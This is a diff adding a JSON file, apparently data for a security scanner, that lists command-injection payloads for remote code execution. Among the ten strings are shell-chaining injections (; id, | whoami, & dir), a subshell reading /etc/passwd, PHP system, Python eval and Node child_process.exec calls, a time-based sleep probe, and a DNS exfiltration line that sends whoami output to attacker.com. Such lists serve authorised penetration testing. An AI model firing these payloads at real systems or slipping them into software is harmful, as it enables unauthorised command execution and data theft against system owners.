@@ -1,0 +1,16 @@
+{
+  "version": "1.0.0",
+  "description": "Remote Code Execution payloads collection",
+  "payloads": [
+    {"name": "Linux Basic", "payload": "; id", "platform": "linux"},
+    {"name": "Linux Pipe", "payload": "| whoami", "platform": "linux"},
+    {"name": "Linux Subshell", "payload": "$(cat /etc/passwd)", "platform": "linux"},
+    {"name": "Windows Basic", "payload": "& dir", "platform": "windows"},
+    {"name": "Windows Pipe", "payload": "| whoami", "platform": "windows"},
+    {"name": "PHP System", "payload": "; system('id');", "language": "php"},
+    {"name": "Python Eval", "payload": "; eval(\"print('test')\")", "language": "python"},
+    {"name": "Node Exec", "payload": "; require('child_process').exec('id')", "language": "node"},
+    {"name": "Time Based", "payload": "; sleep 5", "technique": "time"},
+    {"name": "DNS Exfil", "payload": "; nslookup $(whoami).attacker.com", "technique": "dns"}
+  ]
+}
